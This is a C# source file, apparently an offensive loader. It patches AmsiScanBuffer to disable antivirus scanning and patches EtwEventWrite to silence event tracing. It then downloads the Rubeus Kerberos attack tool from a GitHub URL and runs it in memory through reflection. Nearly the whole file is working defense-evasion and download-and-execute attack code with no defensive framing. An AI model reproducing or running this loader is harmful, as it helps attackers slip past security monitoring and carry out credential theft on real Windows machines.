using System;
using System.IO;
using System.Reflection;
using System.Net;
using System.Threading;
using System.Runtime.InteropServices;

namespace ReflectiveLoader
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }

    class Program
    {
        public static Assembly reflectionFromPath(String path)
        {

            Byte[] rawAssemblyBytes = File.ReadAllBytes(path);
            Assembly bin = Assembly.Load(rawAssemblyBytes);
            return bin;

        }

        public static Assembly reflectionFromURL(String url, int retrycount = 3, int timeoutTimer = 60, bool printText = true)
        {
            int retry = retrycount;
            int timeout = timeoutTimer;
            Byte[] rawAssemblyBytes = { };
            Assembly bin = null;
            WebClient client = new WebClient();
            //provides https capabilities to webclient.
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; //TLS 1.2
            if (printText)
            {
                Console.WriteLine("attempting to download assembly from {0}: \n", url);
            }
            while (retry != 0)
            {
                try
                {
                    //will throw a HttpStatusCode.NotFound if file is not there.
                    rawAssemblyBytes = client.DownloadData(url);
                    Console.WriteLine("assembly found! loading now...");
                    Console.WriteLine("size of assembly: " + rawAssemblyBytes.Length);
                    bin = Assembly.Load(rawAssemblyBytes);
                    return bin;
                }
                catch (WebException webExc) //handle the 404
                {
                    HttpWebResponse response = (HttpWebResponse)webExc.Response;
                    if (response.StatusCode == HttpStatusCode.NotFound) //keep retrying until either file is found or retry attempts are 0
                    {
                        Console.WriteLine("Assembly not found yet. sleeping for {0} seconds and retrying another {1} times...", timeout, retry);
                        retry--;
                        Thread.Sleep(timeout * 1000);
                    }
                }


            }
            throw new WebException("Assembly not found. Aborting...");
        }

        public static void NoPryingEyes()
        {
            Console.WriteLine("Who would win, multibillion dollar company or two bytes?\n");
            byte[] patch;
            patch = new byte[2];
            patch[0] = 0xc3;
            patch[1] = 0x00;
            try
            {
                var lib = Win32.LoadLibrary("ntdll.dll");
                var addr = Win32.GetProcAddress(lib, "EtwEventWrite");
                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, addr, patch.Length);

            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Exception: " + e.Message);
            }
            Console.WriteLine("bye bye ETW");
        }


        public static void AVSucks()
        {
            Console.WriteLine("patching amsi");
            byte[] patch;
            {
                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc3;
            }
            try
            {
                var lib = Win32.LoadLibrary("amsi.dll");
                var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);

            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Exception: " + e.Message);
            }
        }

        public static Type[] getTypes(Assembly assembly, Boolean verbose = false)
        {

            Type[] assemblyTypes = assembly.GetTypes();
            if (verbose)
            {
                Console.WriteLine("The following classes are available in {0}: ", assembly.GetName());
                foreach (Type classType in assemblyTypes)
                {
                    Console.WriteLine(classType.Name);
                }

                Console.WriteLine("==============================");
            }
            return assemblyTypes;
        }

        public static Type GetTypeByShortName(Assembly assembly, String className = "Program")
        {
            Type[] assemblyTypes = assembly.GetTypes();
            Type classType = null;
            String errorString = "";
            foreach (Type cType in assemblyTypes)
            {
                errorString += "\n" + cType.Name;
                if (className == cType.Name)
                {
                    classType = cType;
                }
            }
            if (classType == null)
            {
                throw new NullReferenceException(String.Format("{0} could not be found, available classes are {1}", className, errorString));
            }
            return classType;
        }

        public static void Execute(Assembly tool, Object[] arguments, String function = "Main", String className = "Program")
        {
            try
            {
                Type program = GetTypeByShortName(tool, className);
                MethodInfo functionEntryPoint = program.GetMethod(function, BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Public);
                object initalizedProgram = Activator.CreateInstance(program);
                Console.WriteLine(String.Format("Calling {0} method from {1} of {2}...", functionEntryPoint.Name, program.Name, tool.GetName()));
                functionEntryPoint.Invoke(initalizedProgram, arguments);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
        }



        public static MethodInfo[] getMethodsForType(Type classType, Boolean verbose = false)
        {
            MethodInfo[] methods = classType.GetMethods();
            if (verbose)
            {
                Console.WriteLine("The available methods for {0} are: ", classType.Name);
                foreach (MethodInfo method in methods)
                {

                    Console.WriteLine(method.Name);
                    //Console.WriteLine(method.Attributes);
                }
                Console.WriteLine("==============================");
            }
            return methods;
        }



        //public static void 
        static void Main(string[] args)
        {
            try
            {
                AVSucks();
                Console.WriteLine("waiting before patching ETW");
                Console.ReadKey();
                NoPryingEyes();
                Assembly loadedAssembly = reflectionFromURL(@"https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Rubeus.exe?raw=true", 3, 5);
                Object[] funcArgs = new String[] { null };
                Execute(loadedAssembly, funcArgs);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.ReadKey();


        }
    }
}